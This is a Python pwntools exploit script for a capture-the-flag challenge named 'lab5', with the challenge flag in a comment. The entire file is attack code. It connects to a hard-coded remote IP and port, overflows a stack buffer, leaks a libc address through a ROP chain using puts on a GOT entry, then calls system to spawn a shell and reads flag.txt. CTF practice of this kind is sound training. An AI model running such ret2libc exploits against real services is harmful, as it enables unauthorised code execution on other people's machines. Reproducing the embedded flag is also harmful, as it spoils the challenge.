#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{aR0uNisULrYO4eVnG2jI}

context.arch = 'amd64'

e = ELF('./lab5')

host , port = '35.194.234.201' , 2115

y = remote( host , port )

pop_rdi = 0x4006f3
main = 0x400636


p = flat(
    'D' * 0x28,
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)

y.sendlineafter( ':' , p )

y.recvline()

l = u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x20740
log.success( 'libc -> %s' % hex( l ) )

p = flat(
    'D' * 0x28,
    pop_rdi,
    l + 0x18cd17,
    l + 0x045390,
)

y.sendlineafter( ':' , p )

y.sendline( 'cat ./flag.txt' )


y.interactive()

